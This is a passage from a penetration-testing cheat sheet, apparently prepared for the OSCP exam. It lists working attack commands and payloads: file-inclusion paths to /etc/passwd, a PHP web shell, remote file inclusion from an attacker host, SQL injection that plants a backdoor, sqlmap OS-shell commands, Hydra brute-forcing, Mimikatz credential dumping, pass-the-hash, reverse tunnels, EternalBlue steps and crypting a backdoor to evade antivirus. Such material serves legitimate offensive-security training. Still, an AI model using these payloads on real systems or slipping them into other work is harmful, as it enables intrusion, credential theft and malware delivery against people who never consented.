    -   LFI - Download passwords file with filter evasion  
        [*http://$ip/index.php?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd*](about:blank)

    -   Local File Inclusion - In versions of PHP below 5.3 we can
        terminate with null byte  
        GET
        /addguestbook.php?name=Haxor&comment=Merci!&LANG=../../../../../../../windows/system32/drivers/etc/hosts%00

    -   Contaminating Log Files `<?php echo shell_exec($_GET['cmd']);?>`

    -   For a Remote File Inclusion look for php code that is not  sanitized and passed to the PHP include function and the php.ini
        file must be configured to allow remote files
        
        */etc/php5/cgi/php.ini* - "allow_url_fopen" and "allow_url_include" both set to "on"  
        
        `include($_REQUEST["file"].".php");`

    -   Remote File Inclusion  
    
         `http://192.168.11.35/addguestbook.php?name=a&comment=b&LANG=http://192.168.10.5/evil.txt `
        
         `<?php echo shell\_exec("ipconfig");?>`

-   <span id="_mgu7e3u7svak" class="anchor"><span id="_Toc480741820" class="anchor"></span></span>Database Vulnerabilities
    ----------------------------------------------------------------------------------------------------------------------

    -   Playing with SQL Syntax
    A great tool I have found for playing with SQL Syntax for a variety of database types (MSSQL Server, MySql, PostGreSql, Oracle) is SQL Fiddle:
    
    http://sqlfiddle.com
    
    Another site is rextester.com:
    
    http://rextester.com/l/mysql_online_compiler
    
    -   Detecting SQL Injection Vulnerabilities. 
    
         Most modern automated scanner tools use time delay techniques to detect SQL injection vulnerabilities.  This method can tell you if a SQL injection vulnerability is present even if it is a "blind" sql injection vulnerabilit that does not provide any data back.  You know your SQL injection is working when the server takes a LOooooong time to respond.  I have added a line comment at the end of each injection statement just in case there is additional SQL code after the injection point.
    
    
        - **MSSQL Server SQL Injection Time Delay Detection:**
        Add a 30 second delay to a MSSQL Server Query
      
          - *Original Query*
            
            `SELECT * FROM products WHERE name='Test';`

          - *Injection Value*
          
            `'; WAITFOR DELAY '00:00:30'; --`

          - *Resulting Query*
         
            `SELECT * FROM products WHERE name='Test'; WAITFOR DELAY '00:00:30'; --`

        - **MySQL Injection Time Delay Detection:**
        Add a 30 second delay to a MySQL Query
      
          - *Original Query*
            
            `SELECT * FROM products WHERE name='Test';`

          - *Injection Value*
          
            `'-SLEEP(30); #`

          - *Resulting Query*
         
            `SELECT * FROM products WHERE name='Test'-SLEEP(30); #`


        - **PostGreSQL Injection Time Delay Detection:**
        Add a 30 second delay to an PostGreSQL Query
      
          - *Original Query*
            
            `SELECT * FROM products WHERE name='Test';`

          - *Injection Value*
          
            `'; SELECT pg_sleep(30); --`

          - *Resulting Query*
         
            `SELECT * FROM products WHERE name='Test'; SELECT pg_sleep(30); --`

    -   Grab password hashes from a web application mysql database called Users - once you have the MySQL root username and        password  
    
              mysql -u root -p -h $ip
              use "Users"  
              show tables;  
              select \* from users;

    -   Authentication Bypass  
    
              name='wronguser' or 1=1;  
              name='wronguser' or 1=1 LIMIT 1;

    -   Enumerating the Database  
    
        `http://192.168.11.35/comment.php?id=738)'`  
        
        Verbose error message?  
        
        `http://$ip/comment.php?id=738 order by 1`
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,5,6  `
        
        Determine MySQL Version:  
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,@@version,6  `
        
        Current user being used for the database connection:
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,user(),6  `
        
        Enumerate database tables and column structures  
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,table_name,6 FROM information_schema.tables  `
        
        Target the users table in the database  
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,column_name,6 FROM information_schema.columns where        table_name='users'  `
        
        Extract the name and password  
        
        `http://$ip/comment.php?id=738 union select 1,2,3,4,concat(name,0x3a, password),6 FROM users ` 
        
        Create a backdoor
        
        `http://$ip/comment.php?id=738 union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE        'c:/xampp/htdocs/backdoor.php'`
        

    -   **SQLMap Examples**

      - Crawl the links
      
         `sqlmap -u http://$ip --crawl=1`
         
         `sqlmap -u http://meh.com --forms --batch --crawl=10 --cookie=jsessionid=54321 --level=5 --risk=3`
         
         
      - SQLMap Search for databases against a suspected GET SQL Injection 
      
        `sqlmap u http://$ip/blog/index.php?search dbs`

      - SQLMap dump tables from database oscommerce at GET SQL injection
      
        `sqlmap u http://$ip/blog/index.php?search= dbs D oscommerce tables dumps `
      
      - SQLMap GET Parameter command  
      
         `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --dump -threads=5  `
          
      - SQLMap Post Username parameter
      
          `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --dump-all`
           
      - SQL Map OS Shell
            
          `sqlmap -u http://$ip/comment.php?id=738 --dbms=mysql --osshell  `
      
          `sqlmap -u http://$ip/login.php --method=POST --data="usermail=asc@dsd.com&password=1231" -p "usermail" --risk=3 --level=5 --dbms=MySQL --os-shell`
            
       - Automated sqlmap scan
       
          `sqlmap -u TARGET -p PARAM --data=POSTDATA --cookie=COOKIE --level=3 --current-user --current-db --passwords  --file-read="/var/www/blah.php"`
             
        - Targeted sqlmap scan
        
           `sqlmap -u "http://meh.com/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump`
             
         - Scan url for union + error based injection with mysql backend and use a random user agent + database dump  
         
            `sqlmap -o -u http://$ip/index.php --forms --dbs  `
               
            `sqlmap -o -u "http://$ip/form/" --forms`
                
          - Sqlmap check form for injection  
          
             `sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump`
                 
           - Enumerate databases  
           
              `sqlmap --dbms=mysql -u "$URL" --dbs`
                
            - Enumerate tables from a specific database  
                  
              `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables  `
                  
            - Dump table data from a specific database and table  
            
               `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump `
                   
            - Specify parameter to exploit  
             
               `sqlmap --dbms=mysql -u "http://www.example.com/param1=value1&param2=value2" --dbs -p param2 `
                    
            - Specify parameter to exploit in 'nice' URIs (exploits param1)
             
                `sqlmap --dbms=mysql -u "http://www.example.com/param1/value1*/param2/value2" --dbs `
                     
            - Get OS shell  
              
                 `sqlmap --dbms=mysql -u "$URL" --os-shell`
                       
            - Get SQL shell  
                       
                 `sqlmap --dbms=mysql -u "$URL" --sql-shell`
                        
             - SQL query  
                
                `sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"` 
                         
             - Use Tor Socks5 proxy  
                 
                `sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs`
       
       
-   **NoSQLMap Examples**
       You may encounter NoSQL instances like MongoDB in your OSCP journies (`/cgi-bin/mongo/2.2.3/dbparse.py`).  NoSQLMap can help you to automate NoSQLDatabase enumeration. 
       
  -   NoSQLMap Installation 
   
        ```bash
        git clone https://github.com/codingo/NoSQLMap.git
        cd NoSQLMap/
        ls
        pip install couchdb
        pip install pbkdf2
        pip install ipcalc
        python nosqlmap.py
        ```


   -   Often you can create an exception dump message with MongoDB using a malformed NoSQLQuery such as:
   
      `a'; return this.a != 'BadData'; var dummy='!`
      
      

-   Password Attacks
    --------------------------------------------------------------------------------------------------------------

    -   AES Decryption  
        http://aesencryption.net/

    -   Convert multiple webpages into a word list
        ```bash
        for x in 'index' 'about' 'post' 'contact' ; do \
          curl http://$ip/$x.html | html2markdown | tr -s ' ' '\\n' >> webapp.txt ; \
        done
        ```

    -   Or convert html to word list dict  
        `html2dic index.html.out | sort -u > index-html.dict`

    -   Default Usernames and Passwords

        -   CIRT  
            [*http://www.cirt.net/passwords*](http://www.cirt.net/passwords)

        -   Government Security - Default Logins and Passwords for
            Networked Devices

        -   [*http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php*](http://www.governmentsecurity.org/articles/DefaultLoginsandPasswordsforNetworkedDevices.php)

        -   Virus.org  
            [*http://www.virus.org/default-password/*](http://www.virus.org/default-password/)

        -   Default Password  
            [*http://www.defaultpassword.com/*](http://www.defaultpassword.com/)

    -   Brute Force

        -   Nmap Brute forcing Scripts  
            [*https://nmap.org/nsedoc/categories/brute.html*](https://nmap.org/nsedoc/categories/brute.html)

        -   Nmap Generic auto detect brute force attack:
            `nmap --script brute -Pn <target.com or ip>`

        -   MySQL nmap brute force attack:
            `nmap --script=mysql-brute $ip`

    -   Dictionary Files

        -   Word lists on Kali  
            `cd /usr/share/wordlists`

    -   Key-space Brute Force

        -   `crunch 6 6 0123456789ABCDEF -o crunch1.txt`

        -   `crunch 4 4 -f /usr/share/crunch/charset.lst mixalpha`

        -   `crunch 8 8 -t ,@@^^%%%`

    -   Pwdump and Fgdump - Security Accounts Manager (SAM)

        -   `pwdump.exe` - attempts to extract password hashes

        -   `fgdump.exe` - attempts to kill local antiviruses before
            attempting to dump the password hashes and
            cached credentials.

    -   Windows Credential Editor (WCE)

        -   allows one to perform several attacks to obtain clear text
            passwords and hashes. Usage: `wce -w`

    -   Mimikatz

        -   extract plaintexts passwords, hash, PIN code and kerberos
            tickets from memory. mimikatz can also perform
            pass-the-hash, pass-the-ticket or build Golden tickets  
            [*https://github.com/gentilkiwi/mimikatz*](https://github.com/gentilkiwi/mimikatz)
            From metasploit meterpreter (must have System level access):
            ```
            meterpreter> load mimikatz
            meterpreter> help mimikatz
            meterpreter> msv
            meterpreter> kerberos
            meterpreter> mimikatz_command -f samdump::hashes
            meterpreter> mimikatz_command -f sekurlsa::searchPasswords
            ```

    -   Password Profiling

        -   cewl can generate a password list from a web page  
            `cewl www.megacorpone.com -m 6 -w megacorp-cewl.txt`

    -   Password Mutating

        -   John the ripper can mutate password lists  
            nano /etc/john/john.conf  
            `john --wordlist=megacorp-cewl.txt --rules --stdout > mutated.txt`

    -   Medusa

        -   Medusa, initiated against an htaccess protected web
            directory  
            `medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 10`

    -   Ncrack

        -   ncrack (from the makers of nmap) can brute force RDP  
            `ncrack -vv --user offsec -P password-file.txt rdp://$ip`

    -   Hydra

        -   Hydra brute force against SNMP  
        
            `hydra -P password-file.txt -v $ip snmp`

        -   Hydra FTP known user and rockyou password list  
        
            `hydra -t 1 -l admin -P /usr/share/wordlists/rockyou.txt -vV $ip ftp`

        -   Hydra SSH using list of users and passwords  
        
            `hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u $ip ssh`

        -   Hydra SSH using a known password and a username list  
        
            `hydra -v -V -u -L users.txt -p "<known password>" -t 1 -u $ip ssh`

        -   Hydra SSH Against Known username on port 22
        
            `hydra $ip -s 22 ssh -l <user> -P big_wordlist.txt`

        -   Hydra POP3 Brute Force  
        
            `hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f $ip pop3 -V`

        -   Hydra SMTP Brute Force  
        
            `hydra -P /usr/share/wordlistsnmap.lst $ip smtp -V`

        -   Hydra attack http get 401 login with a dictionary  
        
            `hydra -L ./webapp.txt -P ./webapp.txt $ip http-get /admin`
            
        -   Hydra attack Windows Remote Desktop with rockyou
        
            `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$ip`
            
        -   Hydra brute force SMB user with rockyou:
        
            `hydra -t 1 -V -f -l administrator -P /usr/share/wordlists/rockyou.txt $ip smb`
            
        -   Hydra brute force a Wordpress admin login
        
            `hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'`

          

-   <span id="_bnmnt83v58wk" class="anchor"><span id="_Toc480741822" class="anchor"></span></span>Password Hash Attacks
    -------------------------------------------------------------------------------------------------------------------

    -   Online Password Cracking  
        [*https://crackstation.net/*](https://crackstation.net/)
        [*http://finder.insidepro.com/*](http://finder.insidepro.com/)

    -   Hashcat
    Needed to install new drivers to get my GPU Cracking to work on the Kali linux VM and I also had to use the --force parameter.

      `apt-get install libhwloc-dev ocl-icd-dev ocl-icd-opencl-dev`

      and

      `apt-get install pocl-opencl-icd`


    Cracking Linux Hashes - /etc/shadow file
    ```
     500 | md5crypt $1$, MD5(Unix)                          | Operating-Systems
    3200 | bcrypt $2*$, Blowfish(Unix)                      | Operating-Systems
    7400 | sha256crypt $5$, SHA256(Unix)                    | Operating-Systems
    1800 | sha512crypt $6$, SHA512(Unix)                    | Operating-Systems
    ```
    Cracking Windows Hashes
    ```
    3000 | LM                                               | Operating-Systems
    1000 | NTLM                                             | Operating-Systems
    ```
    Cracking Common Application Hashes
    ```
      900 | MD4                                              | Raw Hash
        0 | MD5                                              | Raw Hash
     5100 | Half MD5                                         | Raw Hash
      100 | SHA1                                             | Raw Hash
    10800 | SHA-384                                          | Raw Hash
     1400 | SHA-256                                          | Raw Hash
     1700 | SHA-512                                          | Raw Hash
    ```

    Create a .hash file with all the hashes you want to crack
    puthasheshere.hash:
    `$1$O3JMY.Tw$AdLnLjQ/5jXF9.MTp3gHv/`
   
    Hashcat example cracking Linux md5crypt passwords $1$ using rockyou:
   
    `hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt`
   
    Wordpress sample hash: `$P$B55D6LjfHDkINU5wF.v2BuuzO0/XPk/`
   
    Wordpress clear text: `test`
   
    Hashcat example cracking Wordpress passwords using rockyou:
   
      `hashcat --force -m 400 -a 0 -o found1.txt --remove wphash.hash /usr/share/wordlists/rockyou.txt`

    -   Sample Hashes  
        [*http://openwall.info/wiki/john/sample-hashes*](http://openwall.info/wiki/john/sample-hashes)

    -   Identify Hashes  
    
        `hash-identifier`

    -   To crack linux hashes you must first unshadow them:  
    
        `unshadow passwd-file.txt shadow-file.txt`

        `unshadow passwd-file.txt shadow-file.txt > unshadowed.txt`

-   John the Ripper - Password Hash Cracking

    -   `john $ip.pwdump`

    -   `john --wordlist=/usr/share/wordlists/rockyou.txt hashes`

    -   `john --rules --wordlist=/usr/share/wordlists/rockyou.txt`

    -   `john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt`

    -   JTR forced descrypt cracking with wordlist  
    
        `john --format=descrypt --wordlist  /usr/share/wordlists/rockyou.txt hash.txt`

    -   JTR forced descrypt brute force cracking  
    
        `john --format=descrypt hash --show`

-   Passing the Hash in Windows

    -   Use Metasploit to exploit one of the SMB servers in the labs.
        Dump the password hashes and attempt a pass-the-hash attack
        against another system:  
          
        `export SMBHASH=aad3b435b51404eeaad3b435b51404ee:6F403D3166024568403A94C3A6561896 `
          
        `pth-winexe -U administrator //$ip cmd`

<span id="_6nmbgmpltwon" class="anchor"><span id="_Toc480741823" class="anchor"></span></span>Networking, Pivoting and Tunneling
================================================================================================================================

-   Port Forwarding - accept traffic on a given IP address and port and
    redirect it to a different IP address and port

    -   `apt-get install rinetd`

    -   `cat /etc/rinetd.conf`

        ```
        # bindadress bindport connectaddress connectport
        w.x.y.z 53 a.b.c.d 80
        ```

-   SSH Local Port Forwarding: supports bi-directional communication
    channels

    -   `ssh <gateway> -L <local port to listen>:<remote host>:<remote port>`

-   SSH Remote Port Forwarding: Suitable for popping a remote shell on
    an internal non routable network

    -   `ssh <gateway> -R <remote port to bind>:<local host>:<local port>` 

-   SSH Dynamic Port Forwarding: create a SOCKS4 proxy on our local
    attacking box to tunnel ALL incoming traffic to ANY host in the DMZ
    network on ANY PORT

    -   `ssh -D <local proxy port> -p <remote port> <target>`

-   Proxychains - Perform nmap scan within a DMZ from an external
    computer

    -   Create reverse SSH tunnel from Popped machine on :2222  
        
        `ssh -f -N -T -R22222:localhost:22 yourpublichost.example.com`
        `ssh -f -N -R 2222:<local host>:22 root@<remote host>`

    -   Create a Dynamic application-level port forward on 8080 thru
        2222  
        
        `ssh -f -N -D <local host>:8080 -p 2222 hax0r@<remote host>`

    -   Leverage the SSH SOCKS server to perform Nmap scan on network
        using proxy chains  
        
        `proxychains nmap --top-ports=20 -sT -Pn $ip/24`

-   HTTP Tunneling  
      
      `nc -vvn $ip 8888`
        `sudo hts -F <server ip addr>:<port of your app> 80  `

-   Traffic Encapsulation - Bypassing deep packet inspection

    -   http tunnel  
        On server side:  
        On client side:  
        `sudo htc -P <my proxy.com:proxy port> -F <port of your app> <server ip addr>:80 stunnel`

-   Tunnel Remote Desktop (RDP) from a Popped Windows machine to your
    network

    -   Tunnel on port 22  
    
        `plink -l root -pw pass -R 3389:<localhost>:3389 <remote host>`

    -   Port 22 blocked? Try port 80? or 443?  
    
        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P80`

-   Tunnel Remote Desktop (RDP) from a Popped Windows using HTTP Tunnel
    (bypass deep packet inspection)

    -   Windows machine add required firewall rules without prompting the user

    -   `netsh advfirewall firewall add rule name="httptunnel_client" dir=in action=allow program="httptunnel_client.exe" enable=yes`

    -   `netsh advfirewall firewall add rule name="3000" dir=in action=allow protocol=TCP localport=3000`

    -   `netsh advfirewall firewall add rule name="1080" dir=in action=allow protocol=TCP localport=1080`

    -   `netsh advfirewall firewall add rule name="1079" dir=in action=allow protocol=TCP localport=1079`

    -   Start the http tunnel client  
    
         `httptunnel_client.exe`

    -   Create HTTP reverse shell by connecting to localhost port 3000  
    
        `plink -l root -pw 23847sd98sdf987sf98732 -R 3389:<local host>:3389 <remote host> -P 3000`

-   VLAN Hopping

    -   ```bash
        git clone https://github.com/nccgroup/vlan-hopping.git  
        chmod 700 frogger.sh  
        ./frogger.sh
        ```
        

-   VPN Hacking

    -   Identify VPN servers:  
        `./udp-protocol-scanner.pl -p ike $ip`

    -   Scan a range for VPN servers:  
        `./udp-protocol-scanner.pl -p ike -f ip.txt`

    -   Use IKEForce to enumerate or dictionary attack VPN servers:  
    
        `pip install pyip`  
        
        `git clone https://github.com/SpiderLabs/ikeforce.git  `
        
        Perform IKE VPN enumeration with IKEForce:  
        
        `./ikeforce.py TARGET-IP e w wordlists/groupnames.dic  `
        
        Bruteforce IKE VPN using IKEForce:  
        
        `./ikeforce.py TARGET-IP -b -i groupid -u dan -k psk123 -w passwords.txt -s 1  `
        Use ike-scan to capture the PSK hash:  
        
        ```bash
        ike-scan  
        ike-scan TARGET-IP  
        ike-scan -A TARGET-IP  
        ike-scan -A TARGET-IP --id=myid -P TARGET-IP-key  
        ike-scan M A n example\_group -P hash-file.txt TARGET-IP
        ```
        Use psk-crack to crack the PSK hash  
        
        ```bash
        psk-crack hash-file.txt  
        pskcrack  
        psk-crack -b 5 TARGET-IPkey  
        psk-crack -b 5 --charset="01233456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz" 192-168-207-134key  
        psk-crack -d /path/to/dictionary-file TARGET-IP-key
        ```

-   PPTP Hacking

    -   Identifying PPTP, it listens on TCP: 1723  
        NMAP PPTP Fingerprint:  
        
        `nmap Pn -sV -p 1723 TARGET(S)  `
        PPTP Dictionary Attack  
        
        `thc-pptp-bruter -u hansolo -W -w /usr/share/wordlists/nmap.lst`

-   Port Forwarding/Redirection

-   PuTTY Link tunnel - SSH Tunneling

    -   Forward remote port to local address:  
    
         `plink.exe -P 22 -l root -pw "1337" -R 445:<local host>:445 <remote host>`

-   SSH Pivoting

    -   SSH pivoting from one network to another:  
    
        `ssh -D <local host>:1010 -p 22 user@<remote host>`

-   DNS Tunneling

    -   dnscat2 supports download and upload commands for getting iles (data and programs) to and from the target machine.

    -   Attacking Machine Installation:  
    
        ```bash
        apt-get update  
        apt-get -y install ruby-dev git make g++  
        gem install bundler  
        git clone https://github.com/iagox86/dnscat2.git  
        cd dnscat2/server  
        bundle install
        ```

    -   Run dnscat2:  
    
        ```
        ruby ./dnscat2.rb  
        dnscat2> New session established: 1422  
        dnscat2> session -i 1422
        ```

    -   Target Machine:  
        [*https://downloads.skullsecurity.org/dnscat2/*](https://downloads.skullsecurity.org/dnscat2/)

        [*https://github.com/lukebaggett/dnscat2-powershell/*](https://github.com/lukebaggett/dnscat2-powershell/)

        `dnscat --host <dnscat server ip>`

<span id="_ujpvtdpc9i67" class="anchor"><span id="_Toc480741824" class="anchor"></span></span>The Metasploit Framework
======================================================================================================================

-   See [*Metasploit Unleashed
    Course*](https://www.offensive-security.com/metasploit-unleashed/)
    in the Essentials

-   Search for exploits using Metasploit GitHub framework source code:  
    [*https://github.com/rapid7/metasploit-framework*](https://github.com/rapid7/metasploit-framework)  
    Translate them for use on OSCP LAB or EXAM.

-   Metasploit

    -   MetaSploit requires Postfresql  
    
        `systemctl start postgresql`

    -   To enable Postgresql on startup  
    
        `systemctl enable postgresql`

-   MSF Syntax

    -   Start metasploit  
        
        `msfconsole  `
        
        `msfconsole -q`

    -   Show help for command  
    
        `show -h`

    -   Show Auxiliary modules  
    
        `show auxiliary`

    -   Use a module  
    
        ```
        use auxiliary/scanner/snmp/snmp_enum  
        use auxiliary/scanner/http/webdav_scanner  
        use auxiliary/scanner/smb/smb_version  
        use auxiliary/scanner/ftp/ftp_login  
        use exploit/windows/pop3/seattlelab_pass
        ```

    -   Show the basic information for a module  
    
        `info`

    -   Show the configuration parameters for a module  
    
        `show options`

    -   Set options for a module  
    
        ```
        set RHOSTS 192.168.1.1-254  
        set THREADS 10
        ```

    -   Run the module  
    
        `run`

    -   Execute an Exploit 
    
        `exploit`

    -   Search for a module  
    
        `search type:auxiliary login`

-   Metasploit Database Access

    -   Show all hosts discovered in the MSF database  
    
        `hosts`

    -   Scan for hosts and store them in the MSF database  
    
        `db_nmap`

    -   Search machines for specific ports in MSF database 
    
        `services -p 443`

    -   Leverage MSF database to scan SMB ports (auto-completed rhosts)  
        
        `services -p 443 --rhosts`

-   Staged and Non-staged

    -   Non-staged payload - is a payload that is sent in its entirety in one go

    -   Staged - sent in two parts  Not have enough buffer space  Or need to bypass antivirus
 
-   MS 17-010 - EternalBlue

    -   You may find some boxes that are vulnerable to MS17-010 (AKA. EternalBlue).  Although, not offically part of the indended course, this exploit can be leveraged to gain SYSTEM level access to a Windows box.  I have never had much luck using the built in Metasploit EternalBlue module.  I found that the elevenpaths version works much more relabily. Here are the instructions to install it taken from the following YouTube video: [*https://www.youtube.com/watch?v=4OHLor9VaRI*](https://www.youtube.com/watch?v=4OHLor9VaRI)


    1. First step is to configure the Kali to work with wine 32bit

        dpkg --add-architecture i386 && apt-get update && apt-get install wine32
        rm -r ~/.wine
        wine cmd.exe
        exit

    2. Download the exploit repostory `https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit`

    3. Move the exploit to `/usr/share/metasploit-framework/modules/exploits/windows/smb` or `~/.msf4/modules/exploits/windows/smb`

    4. Start metasploit console
      

     -   I found that using spoolsv.exe as the PROCESSINJECT yielded results on OSCP boxes.
      
      ```
      use exploit/windows/smb/eternalblue_doublepulsar
      msf exploit(eternalblue_doublepulsar) > set RHOST 10.10.10.10
      RHOST => 10.10.10.10
      msf exploit(eternalblue_doublepulsar) > set PROCESSINJECT spoolsv.exe
      PROCESSINJECT => spoolsv.exe
      msf exploit(eternalblue_doublepulsar) > run
      ```


-   Experimenting with Meterpreter

    -   Get system information from Meterpreter Shell  
    
        `sysinfo`

    -   Get user id from Meterpreter Shell  
    
        `getuid`

    -   Search for a file  
    
        `search -f *pass*.txt`

    -   Upload a file  
    
        `upload /usr/share/windows-binaries/nc.exe c:\\Users\\Offsec`

    -   Download a file  
    
        `download c:\\Windows\\system32\\calc.exe /tmp/calc.exe`

    -   Invoke a command shell from Meterpreter Shell  
    
        `shell`

    -   Exit the meterpreter shell  
    
        `exit`

-   Metasploit Exploit Multi Handler

    -   multi/handler to accept an incoming reverse\_https\_meterpreter
    
        ```
        payload  
        use exploit/multi/handler  
        set PAYLOAD windows/meterpreter/reverse_https  
        set LHOST $ip  
        set LPORT 443  
        exploit  
        [*] Started HTTPS reverse handler on https://$ip:443/
        ```

-   Building Your Own MSF Module

    -   
        ```bash
        mkdir -p ~/.msf4/modules/exploits/linux/misc  
        cd ~/.msf4/modules/exploits/linux/misc  
        cp /usr/share/metasploitframework/modules/exploits/linux/misc/gld\_postfix.rb ./crossfire.rb  
        nano crossfire.rb
        ```


-   Post Exploitation with Metasploit - (available options depend on OS and Meterpreter Cababilities)

    -   `download` Download a file or directory  
        `upload` Upload a file or directory  
        `portfwd` Forward a local port to a remote service  
        `route` View and modify the routing table  
        `keyscan_start` Start capturing keystrokes  
        `keyscan_stop` Stop capturing keystrokes  
        `screenshot` Grab a screenshot of the interactive desktop  
        `record_mic` Record audio from the default microphone for X seconds  
        `webcam_snap` Take a snapshot from the specified webcam  
        `getsystem` Attempt to elevate your privilege to that of local system.  
        `hashdump` Dumps the contents of the SAM database

-   Meterpreter Post Exploitation Features

    -   Create a Meterpreter background session  
    
        `background`

<span id="_51btodqc88s2" class="anchor"><span id="_Toc480741825" class="anchor"></span></span>Bypassing Antivirus Software 
===========================================================================================================================

-   Crypting Known Malware with Software Protectors

    -   One such open source crypter, called Hyperion  
    
        ```bash
        cp /usr/share/windows-binaries/Hyperion-1.0.zip  
        unzip Hyperion-1.0.zip  
        cd Hyperion-1.0/  
        i686-w64-mingw32-g++ Src/Crypter/*.cpp -o hyperion.exe  
        cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libgcc_s_sjlj-1.dll .  
        cp -p /usr/lib/gcc/i686-w64-mingw32/5.3-win32/libstdc++-6.dll .  
        wine hyperion.exe ../backdoor.exe ../crypted.exe
        ```


